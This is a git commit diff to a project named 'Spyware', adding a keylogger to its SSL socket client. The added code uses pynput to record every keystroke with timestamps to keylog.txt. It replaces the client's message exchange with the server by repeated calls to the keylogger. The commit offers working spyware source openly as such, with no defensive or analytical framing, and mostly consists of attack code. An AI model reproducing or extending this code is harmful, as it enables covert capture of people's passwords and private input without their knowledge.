b096e4a9bbf20be90fc0509fb63eea414ef6156b
Ryan adonis <rr1294989@gmail.com>
2024-02-08 00:10:47 +0100

    key

--- Spyware/client/client.py
+++ Spyware/client/client.py
@@ -1,8 +1,23 @@
 import socket
 import ssl
 import os
+from pynput.keyboard import Key, Listener
+import logging
+
+
+def key_logger():
+ 
+    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+    def on_press(key):
+        logging.info(str(key))
+ 
+    with Listener(on_press=on_press) as listener :
+        listener.join()
 
 def main():
+
+    
     # Load the CA CERT
     print('main active')
     ca_cert_path = os.path.join(os.getcwd(), "SSL", "CA", "ca-cert.pem")
@@ -18,16 +33,13 @@ def main():
     # Secure the socket
     client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
     client_ssl.connect((host, port))
-
+#bien ou quoi
     while True:
         try:
             # Get message
-            msg = client_ssl.recv(1024).decode()
-            print(f"Server : {msg}")
+            key_logger()
 
-            # Send message
-            msg = str(input("Client : ")).encode()
-            client_ssl.send(msg)
+
         except Exception as e:
             print(f"Error: {e}")
             break
